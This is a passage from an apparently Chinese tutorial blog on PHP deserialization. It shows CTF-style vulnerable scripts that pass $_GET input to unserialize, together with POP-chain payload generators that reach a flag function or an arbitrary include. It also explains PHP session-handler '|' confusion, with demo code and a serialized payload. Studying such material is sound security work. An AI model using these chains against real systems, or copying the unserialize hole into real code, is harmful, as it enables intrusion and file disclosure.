class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">start_gg</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Call</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test2</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funct</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$test2</span>,<span class=\"variable\">$arr</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span> = <span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">func</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod2 = <span class=\"string\">&quot;字符串拼接&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">string1</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1-&gt;<span class=\"title function_ invoke__\">get_flag</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GetFlag</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_flag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;string&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">start_gg</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Call</span>();　　<span class=\"comment\">//把$mod1赋值为Call类对象</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Call</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1 = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">funct</span>();　　<span class=\"comment\">//把 $mod1赋值为funct类对象</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test2</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funct</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1= <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">func</span>();　　<span class=\"comment\">//把 $mod1赋值为func类对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$test2</span>,<span class=\"variable\">$arr</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span> = <span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">func</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1= <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">string1</span>();　　<span class=\"comment\">//把 $mod1赋值为string1类对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;    </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod2 = <span class=\"string\">&quot;字符串拼接&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">string1</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1= <span class=\"keyword\">new</span> <span class=\"title class_\">GetFlag</span>();　　<span class=\"comment\">//把 $str1赋值为GetFlag类对象      </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;    </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1-&gt;<span class=\"title function_ invoke__\">get_flag</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GetFlag</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_flag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag:&quot;</span>.<span class=\"string\">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> start_gg;　　<span class=\"comment\">//构造start_gg类对象$b</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$b</span>));　　<span class=\"comment\">//显示输出url编码后的序列化对象</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x09\"><a class=\"markdownIt-Anchor\" href=\"#0x09\">#</a> 0x09</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Modifier &#123;</span><br><span class=\"line\">    protected  $var;</span><br><span class=\"line\">    public function append($value)&#123;</span><br><span class=\"line\">        include($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __invoke()&#123;</span><br><span class=\"line\">        $this-&gt;append($this-&gt;var);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Show&#123;</span><br><span class=\"line\">    public $source;</span><br><span class=\"line\">    public $str;</span><br><span class=\"line\">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class=\"line\">        $this-&gt;source = $file;</span><br><span class=\"line\">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        return $this-&gt;str-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;</span><br><span class=\"line\">            echo &quot;hacker&quot;;</span><br><span class=\"line\">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Test&#123;</span><br><span class=\"line\">    public $p;</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;p = array();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __get($key)&#123;</span><br><span class=\"line\">        $function = $this-&gt;p;</span><br><span class=\"line\">        return $function();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class=\"line\">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    $a=new Show;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Modifier &#123;</span><br><span class=\"line\">    protected  $var = &quot;D://1.txt&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Show&#123;</span><br><span class=\"line\">    public $source;</span><br><span class=\"line\">    public $str;</span><br><span class=\"line\">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class=\"line\">        $this-&gt;source = $file;</span><br><span class=\"line\">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Test&#123;</span><br><span class=\"line\">    public $p;</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;p = new Modifier();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$a = new Show();</span><br><span class=\"line\">$a-&gt;source = $a;</span><br><span class=\"line\">$a-&gt;str = new Test();</span><br><span class=\"line\">echo urlencode(serialize($a));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>后面两个例子其实都是一样，原理懒的分析了～</p>\n<h4 id=\"php_session-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#php_session-反序列化\">#</a> PHP_session 反序列化</h4>\n<p>当第一次访问网站时，Seesion_start () 函数就会创建一个唯一的 Session ID，并自动通过 HTTP 的响应头，将这个 Session ID 保存到客户端 Cookie 中。同时，也在服务器端创建一个以 Session ID 命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过 HTTP 的请求头将 Cookie 中保存的 Seesion ID 再携带过来，这时 Session_start () 函数就不会再去分配一个新的 Session ID，而是在服务器的硬盘中去寻找和这个 Session ID 同名的 Session 文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>\n<p><strong>session_start 的作用</strong></p>\n<p>当会话自动开始或者通过 session_start () 手动开始的时候， PHP 内部会依据客户端传来的 PHPSESSID 来获取现有的对应的会话数据（即 session 文件）， PHP 会自动反序列化 session 文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为 sess_PHPSESSID (客户端传来的) 的文件。如果客户端未发送 PHPSESSID，则创建一个由 32 个字母组成的 PHPSESSID，并返回 set-cookie。</p>\n<p><strong>Session 存储机制</strong></p>\n<p>PHP 中的 Session 中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以 sess_sessionid 来进行命名的，文件的内容就是 Session 值的序列化之后的内容。</p>\n<p>先来大概了解一下 PHP Session 在 php.ini 中主要存在以下配置项：</p>\n<p>在 PHP 中 Session 有三种序列化的方式，分别是 php，php_serialize，php_binary，不同的引擎所对应的 Session 的存储的方式不同</p>\n<table>\n<thead>\n<tr>\n<th><strong>存储引擎</strong></th>\n<th><strong>存储方式</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>php_binary</td>\n<td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值</td>\n</tr>\n<tr>\n<td>php</td>\n<td>键名 + 竖线 + 经过 serialize () 函数序列处理的值</td>\n</tr>\n<tr>\n<td>php_serialize</td>\n<td>(PHP&gt;5.5.4) 经过 serialize () 函数序列化处理的数组</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username|s:5:&quot;aaaaa&quot;;    //php</span><br><span class=\"line\">\busernames:5:&quot;bbbbb&quot;;    //php_binary,最前面为ASCII中的不可见字符</span><br><span class=\"line\">a:1:&#123;s:8:&quot;username&quot;;s:5:&quot;bbbbb&quot;;&#125;    //php_serialize</span><br></pre></td></tr></table></figure>\n<p><strong>Session 反序列化漏洞</strong></p>\n<p>PHP 在 session 存储和读取时，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，PHP 中的 Session 的实现是没有的问题的，<strong>漏洞主要是由于使用不同的引擎来处理 session 文件造成的</strong>。</p>\n<p>存在对 $_SESSION 变量赋值</p>\n<p>漏洞的主要原因在于不同的引擎对于竖杠’ | ' 的解析产生歧义。</p>\n<p>对于 php_serialize 引擎来说’ | ‘可能只是一个正常的字符；但对于 php 引擎来说’ | ‘就是分隔符，前面是 $_SESSION [‘username’] 的键名 ，后面是 GET 参数经过 serialize 序列化后的值。从而在解析的时候造成了歧义，导致其在解析 Session 文件时直接对’ | ' 后的值进行反序列化处理。</p>\n<p>举个例子：</p>\n<p>先使用 php_serialize 引擎来存储 Session，在使用 php 引擎读取 session</p>\n<p>Session1.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$_SESSION[&#x27;username&#x27;] = $_GET[&#x27;user&#x27;];</span><br><span class=\"line\">echo &quot;&lt;pre&gt;&quot;;</span><br><span class=\"line\">var_dump($_SESSION);</span><br><span class=\"line\">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>接下来使用 php 引擎来读取 Session 文件</p>\n<p>Session2.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">class user&#123;</span><br><span class=\"line\">    var $name;</span><br><span class=\"line\">    var $age;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        echo &quot;hello &quot;.$this-&gt;name.&quot; !&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uc2Vzc2lvbi1zZXQtc2F2ZS1oYW5kbGVyLnBocA==\">session_set_save_handler()</span> 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。</p>\n</blockquote>\n<p>可以看到 PHP 能自动反序列化数据的前提是，现有的会话数据是以特殊的序列化格式存储。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//那么上一个例子的payload是：</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class user&#123;</span><br><span class=\"line\">        var $name;</span><br><span class=\"line\">        var $age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $a = new user();</span><br><span class=\"line\">    $a-&gt;name = &quot;bmjoker&quot;;</span><br><span class=\"line\">    $a-&gt;age = &quot;888&quot;;</span><br><span class=\"line\">    echo serialize($a);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//</span><br><span class=\"line\">O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span 